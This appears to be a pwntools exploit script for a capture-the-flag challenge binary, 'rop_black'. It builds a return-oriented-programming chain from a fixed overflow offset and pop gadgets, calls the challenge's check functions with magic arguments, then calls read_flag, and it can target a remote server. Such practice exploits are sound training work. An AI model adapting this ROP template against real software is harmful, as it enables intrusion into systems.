#!/usr/bin/python3
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x80492ce
break *0x8049293
break *0x80492e8
break *0x804930b
break *0x80491c2
continue
'''.format(**locals())

# Binary filename
exe = './rop_black'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# ========================= #
# capcha = 0x804c044
# african = 0x804c03c
# invite_code = 0x804c040
# check_file = 0x804c038
# ========================= #

offset = 22
gadget1 = 0x0804901e # pop ebx; ret; 
gadget2 = 0x080493ea # pop edi; pop ebp; ret; 

# Build the payload
payload = flat({
    offset: [
        elf.symbols['check_capcha'],
        gadget2,
        0x062023,
        0xbf1212,
        elf.symbols['check_african'],
        elf.symbols['check_flag'],
        gadget1,
        0x804b033,
        elf.symbols['check_invitecode'],
        gadget1,
        0xbae,
        elf.sym['read_flag']
    ]
})

# Send the payload
io.sendline(payload)

io.interactive()
